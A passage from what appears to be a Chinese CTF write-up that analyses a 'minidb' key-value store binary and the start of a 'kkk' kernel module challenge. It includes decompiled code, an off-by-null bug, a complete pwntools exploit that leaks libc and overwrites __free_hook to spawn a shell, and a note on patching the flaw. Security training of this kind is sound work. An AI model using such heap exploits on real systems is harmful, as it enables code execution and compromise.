Invalid choice!\x1B[0m&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v3 != <span class="hljs-number">666</span> );<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中判断是否存在重复键的逻辑如下，可以看出数据储存方式是哈希表 + 单向链表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">_QWORD *__fastcall <span class="hljs-title function_">sub_168D</span><span class="hljs-params">(__int64 a1, __int64 a2, _QWORD *a3)</span><br>&#123;<br>  _QWORD *v4; <span class="hljs-comment">// [rsp+28h] [rbp-10h]</span><br>  _QWORD *v5; <span class="hljs-comment">// [rsp+30h] [rbp-8h]</span><br><br>  v4 = *(_QWORD **)(a1 + <span class="hljs-number">8</span> * ((<span class="hljs-type">unsigned</span> __int8)a2 + <span class="hljs-number">2LL</span>)); <span class="hljs-comment">/* hash to %256 */</span><br>  v5 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">while</span> ( v4 )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( a2 == v4[<span class="hljs-number">1</span>] )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( a3 )<br>        *a3 = v5;<br>      <span class="hljs-keyword">return</span> v4;<br>    &#125;<br>    v5 = v4;<br>    v4 = (_QWORD *)*v4;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>由此我们可以逆向出数据库与键值对的结构体定义分别如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">db_item</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">db_item</span> *<span class="hljs-title">next</span>;</span><br>    <span class="hljs-type">int64_t</span> key;<br>    <span class="hljs-type">char</span> value[<span class="hljs-number">0</span>]; <span class="hljs-comment">/* 128 or 256 here */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">database</span> &#123;</span><br>    <span class="hljs-type">int64_t</span> type;<br>    <span class="hljs-type">char</span> *name;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">db_item</span> *<span class="hljs-title">kv</span>[256];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>漏洞点在于编辑键值对的功能中，这里在读取用户输入后会先在键值对末尾放置 <code>&#39;\0&#39;</code> 后再检查长度，虽然限制了最大输入长度为 255 字符，但键值对的值长度有 <code>128</code> 和 <code>256</code> 两种类型，<strong>对于前者而言我们可以利用该漏洞完成一个堆上越界写 \0</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_1A81</span><span class="hljs-params">(_DWORD *a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+1Ch] [rbp-224h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+20h] [rbp-220h] BYREF</span><br>  __int64 v4; <span class="hljs-comment">// [rsp+28h] [rbp-218h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">520</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-210h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+238h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( a1 )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input the key: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v3);<br>    v4 = sub_168D(a1, v3, <span class="hljs-number">0LL</span>);<br>    <span class="hljs-keyword">if</span> ( v4 )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input the new value: &quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%255s&quot;</span>, s);<br>      v2 = <span class="hljs-built_in">strlen</span>(s);<br>      *(_BYTE *)(v4 + v2 + <span class="hljs-number">16</span>) = <span class="hljs-number">0</span>; <span class="hljs-comment">/* vulnerability here */</span><br>      <span class="hljs-keyword">if</span> ( (*a1 == <span class="hljs-number">1</span> || *a1 == <span class="hljs-number">2</span>) &amp;&amp; v2 &gt; <span class="hljs-number">127</span> || (*a1 == <span class="hljs-number">3</span> || *a1 == <span class="hljs-number">4</span>) &amp;&amp; v2 &gt; <span class="hljs-number">255</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] The length of new value is TOOOOOO LOOOOONG!\x1B[0m&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span> *)(v4 + <span class="hljs-number">16</span>), s, v2);<br>        *(_BYTE *)(v4 + v2 + <span class="hljs-number">16</span>) = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Succesfully update the value of specific key!&quot;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Key NOT FOUND!\x1B[0m&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Runtime error! No database provided!\x1B[0m&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v6;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>由于是签到题难度所以解法比较俗，简单风水一下利用越界写改一个数据库的 <code>database-&gt;name</code> 指向另一个 chunk，释放进 unsorted bin 利用 UAF read 泄露 libc 后重取释放回 tcache 后劫持 next 指针打 <code>__free_hook</code> 即可</p><blockquote><p>感觉也没啥好说的，毕竟本来就是签到题难度（</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-comment"># p = process(&#x27;./minidb&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span>, value:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the value: &quot;</span>)<br>    p.sendline(value)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">query_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span>, value:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the new value: &quot;</span>)<br>    p.sendline(value)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit_db</span>():<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;666&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_db</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>:<span class="hljs-built_in">int</span>, name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(name)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the type of database: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">use_db</span>(<span class="hljs-params">name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_db</span>(<span class="hljs-params">name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list_db</span>():<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_db_name</span>(<span class="hljs-params">orig_name:<span class="hljs-built_in">bytes</span>, new_name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;5&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(orig_name)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the new name for database: &quot;</span>)<br>    p.sendline(new_name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    <span class="hljs-comment"># pre heap fengshui </span><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span>)<br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        add_kv(i, <span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    exit_db()<br><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba4&quot;</span>)<br>    use_db(<span class="hljs-string">b&quot;arttnba4&quot;</span>)<br><br>    exit_db()<br><br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    add_kv(<span class="hljs-number">114514</span>, <span class="hljs-string">b&quot;rat3bant&quot;</span>) <span class="hljs-comment"># the victim</span><br>    add_kv(<span class="hljs-number">1919810</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span>)<br>    delete_kv(<span class="hljs-number">1919810</span>)<br><br>    exit_db()<br><br>    delete_db(<span class="hljs-string">b&quot;arttnba4&quot;</span>)<br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span> * (<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>)) <span class="hljs-comment"># reget 1919810</span><br><br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br>    update_kv(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">8</span>)) <span class="hljs-comment"># db-&gt;name is 114514 now</span><br><br>    <span class="hljs-comment"># fullfill the tcache</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add_kv(<span class="hljs-number">1919810</span> + i, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        delete_kv(<span class="hljs-number">1919810</span> + i)<br><br>    <span class="hljs-comment"># get an UAF unsorted chunk and leak libc</span><br>    delete_kv(<span class="hljs-number">114514</span>)<br>    exit_db()<br>    list_db()<br><br>    libc_leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    main_arena = libc_leak - <span class="hljs-number">96</span><br>    __malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    log.info(<span class="hljs-string">&quot;Get libc addr leak: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_leak))<br>    log.success(<span class="hljs-string">&quot;Libc base: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-comment"># reget the victim</span><br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add_kv(<span class="hljs-number">1919810</span> + i, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><br>    add_kv(<span class="hljs-number">114514</span>, <span class="hljs-string">b&quot;rat3bant&quot;</span>) <span class="hljs-comment"># the victim</span><br><br>    <span class="hljs-comment"># free the victim and leak heap base</span><br>    delete_kv(<span class="hljs-number">1919810</span> + <span class="hljs-number">6</span>)<br>    delete_kv(<span class="hljs-number">114514</span>)<br><br>    exit_db()<br>    list_db()<br>    p.recvuntil(<span class="hljs-string">b&#x27;\tarttnba3\n\t&#x27;</span>)<br>    heap_leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    heap_base = heap_leak - <span class="hljs-number">0x1640</span><br>    log.info(<span class="hljs-string">&quot;Get heap addr leak: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_leak))<br>    log.success(<span class="hljs-string">&quot;Heap base: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>    <span class="hljs-comment"># hijack the tcache list to __free_hook</span><br>    update_db_name(p64(heap_leak)[:<span class="hljs-number">6</span>], <br>                   p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x88</span>) \<br>                   + <span class="hljs-string">b&quot;arttnba3&quot;</span> * ((<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>))<br><br>    <span class="hljs-comment"># overwrite __free_hook by dbname</span><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba4&quot;</span> * (<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>))<br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span> * ((<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>) \<br>                 + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br><br>    <span class="hljs-comment"># trigger</span><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br>    delete_db(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br><br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br><br></code></pre></td></tr></table></figure><p>运行即可 get shell</p><p><img src="https://s2.loli.net/2023/07/14/oxBjs2IzF83JucH.png" alt="image.png"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>直接把多余的漏洞指令给 nop 掉即可</p><p><img src="https://s2.loli.net/2023/07/07/SRjxs1QnDpKFowk.png" alt="image.png"></p><p><img src="https://s2.loli.net/2023/07/07/XiDM3odbWxmpTRe.png" alt="image.png"></p><h1 id="0x02-kkk（困难）"><a href="#0x02-kkk（困难）" class="headerlink" title="0x02. kkk（困难）"></a>0x02. kkk（困难）</h1><p>不知道为啥没人 <code>break</code> 的一道题目，漏洞本身利用的空间也挺大的，而且都有好几个队伍 <code>fix</code> 成功了，怎么最后解开的队伍数量还是 0 呢  :（</p><h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目提供了一个 <code>kkk.ko</code>，惯例拖入 IDA，其 <code>ioctl()</code> 只提供了两个功能——读取 <code>k2u</code> 队列与写入 <code>u2k</code> 队列：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">kkk_ioctl</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2, __int64 a3)</span><br>&#123;<br>  mutex_lock(&amp;ioctl_lock);<br>  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0x1919810</span> )<br>  &#123;<br>    kkk_write_u2k_queue(a3);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0x114514</span> )<br>  &#123;<br>    kkk_read_k2u_queue(a3);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    printk(&amp;unk_143E);<br>  &#125;<br>  mutex_unlock(&amp;ioctl_lock);<br>  <span class="hljs-keyword">return</span> _x86_return_thunk();<br>&#125;<br></code></pre></td></tr></table></figure><p>写入 <code>u2k</code> 队列首先会判断队列是否已满，之后分配一个 object 并将数据从用户空间拷贝到内核空间，这里我们可以看出在队列当中的每个 object 都应当带有一个 <code>header</code> ，在 <code>header</code> 之后才是真正的用户数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">kkk_write_u2k_queue</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// r13</span><br>  __int64 v2; <span class="hljs-comment">// rax</span><br>  __int64 v3; <span class="hljs-comment">// r15</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// r12</span><br>  __int64 v5; <span class="hljs-comment">// rbx</span><br>  __int64 v7[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-48h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+10h] [rbp-38h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+18h] [rbp-30h]</span><br><br>  v9 = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  v8 = <span class="hljs-number">0LL</span>;<br>  v7[<span class="hljs-number">1</span>] = <span class="hljs-number">0LL</span>;<br>  v7[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  mutex_lock(&amp;u2k_lock);<br>  v1 = ((_WORD)u2k_tail + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFF</span>;<br>  <span class="hljs-keyword">if</span> ( u2k_head != v1 &amp;&amp; !copy_from_user(v7, a1, <span class="hljs-number">24LL</span>) &amp;&amp; v8 &lt;= <span class="hljs-number">0xFFFFFFFFFFFFFFE7</span>LL )<br>  &#123;<br>    v2 = _kmalloc(v8 + <span class="hljs-number">24</span>, <span class="hljs-number">4197568LL</span>);<br>    <span class="hljs-keyword">if</span> ( v2 )<br>    &#123;<br>      v3 = v2;<br>      v4 = v8 + <span class="hljs-number">24</span>;<br>      <span class="hljs-keyword">if</span> ( ((v8 + <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFFFFFFFF80000000</span>LL) != <span class="hljs-number">0</span> )<br>        BUG();<br>      _check_object_size(v2, v8 + <span class="hljs-number">24</span>, <span class="hljs-number">0LL</span>);<br>      <span class="hljs-keyword">if</span> ( copy_from_user(v3, a1, v4) )<br>      &#123;<br>        kfree(v3);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v5 = u2k_tail;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)u2k_tail &gt;= <span class="hljs-number">0x1000</span> )<br>          _ubsan_handle_out_of_bounds(&amp;off_24B0, u2k_tail);<br>        u2k_queue[v5] = v3;<br>        u2k_tail = v1;<br>      &#125;<br>    &#125;<br>  &#125;<br>  mutex_unlock(&amp;u2k_lock);<br>  <span class="hljs-keyword">return</span> _x86_return_thunk();<br>&#125;<br></code></pre></td></tr></table></figure><p>读取 <code>k2u</code> 队列则是直接将队列中的 object 整个拷贝回用户空间，注意到这里存在一个漏洞：<strong>即使数据拷贝失败也会释放 object，但该 object 不会出队列，从而导致我们可以使得一个 object 被多次 free</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 